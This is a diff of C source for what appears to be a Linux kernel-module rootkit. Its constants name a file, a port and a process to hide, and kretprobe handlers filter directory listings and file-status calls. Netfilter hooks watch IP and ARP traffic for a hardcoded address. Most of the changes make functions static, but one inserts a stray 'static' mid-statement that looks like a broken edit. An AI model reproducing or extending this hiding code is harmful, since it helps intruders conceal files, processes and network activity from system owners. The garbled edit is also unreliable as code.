@@ -26,6 +26,7 @@
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
 const char* pid_to_hide = "/proc/3910";
+const char selected_ip[4] = {192, 168, 1, 208};
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -177,7 +178,7 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
                     new_length += row_length;
                 }
             }
-
+            static 
             row_start += row_length;
         }
         
@@ -227,11 +228,10 @@ static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_reg
     return 0;
 }
 
-const char selected_ip[4] = {192, 168, 1, 208};
 
-unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
-    struct ethhdr *eth = eth_hdr(skb);
+    // struct ethhdr *eth = eth_hdr(skb);
     struct iphdr *ip = ip_hdr(skb);
 
     // printk("caller: %s\n", current->comm);
@@ -295,7 +295,7 @@ struct arp_ip_request {
     unsigned char target_ip_addr[4];
 };
 
-unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
+static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
     struct arphdr * arp = arp_hdr(skb);
     struct arp_ip_request  arp_request;
     unsigned short op = ntohs(arp->ar_op);
